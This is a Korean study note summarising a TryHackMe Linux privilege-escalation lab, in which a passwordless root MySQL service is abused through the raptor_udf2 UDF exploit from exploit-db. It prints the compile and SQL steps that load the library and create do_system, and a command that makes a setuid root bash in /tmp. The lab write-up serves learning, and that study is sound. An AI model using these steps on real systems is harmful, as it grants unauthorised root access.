# Service Exploit
## INTRO
> 시스템 내에 실행 중인 서비스를 대상으로 루트 권한 상승을 일으키는 예제

## TAKE 1
- 보안 설정이 약한 MySQL 서비스는 루트로 실행할 경우 패스워드를 물어보진 않을 것이다
```
$ mysql -u root

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 36
Server version: 5.1.73-1+deb6u1 (Debian)

Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```
- MySQL에는 UDF (User Define Function) 즉 사용자 정의 함수를 통해 기능을 추가할 수 있다. UDF는 C나 C++로 작성해 추가한다. C나 C++은 보안 공부에 있어 거쳐야하는 단계이지만 몰라도 괜찮다 exploit-db를 통해 공략해보자
 - MySQL UDF : https://www.exploit-db.com/exploits/1518


### TAKE 2
- exploit-db에 나와있는 문서를 통해 해당 취약점을 어떻게 이용하는지 알아보자. 영어로 되어있는 문서들의 내용을 열심히 해독하다 보면 다음과 같은 내용들이 나온다
```
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 [...]
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
```
- 명령어만 봐도 대충 어떻게 이용할 수 있는지 알 수 있다.
- 참조한 exploit-db의 링크에는 do_system 함수(UDF)가 정의 되어있는데 이를 root 권한으로 실행된 MySQL에서 이용할 수 있게 해주는 SQL문이다.
- 결론적으로는 do_system 함수를 다음과 같이 썼을 때
  ```sql
  select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
  ``` 
  root 권한을 가진 bash 쉘을 tmp 디렉토리에 rootbash 파일로 복사해 실행하게 한다면 권한 상승을 일으킬 수 있다

### TAKE 3
- 위 과정은 TryHackMe의 LinuxPrivEsc Task2를 정리한 내용
- MySQL의 UDF를 예제로 설명했지만 실제로 시스템 내에 실행중인 Service를 대상으로 권한 상승을 일으키는 일은 더 많은 조사와 노력들이 필요할 것이다. 그러니 다음과 같은 체크포인트를 생각해보며 검색을 해보자
  - [x] 서비스 버전 조사  
  - [x] 루트 권한으로 실행중인 서비스 탐색
  - [x] exploit-db를 통해 공략 정보 탐색
  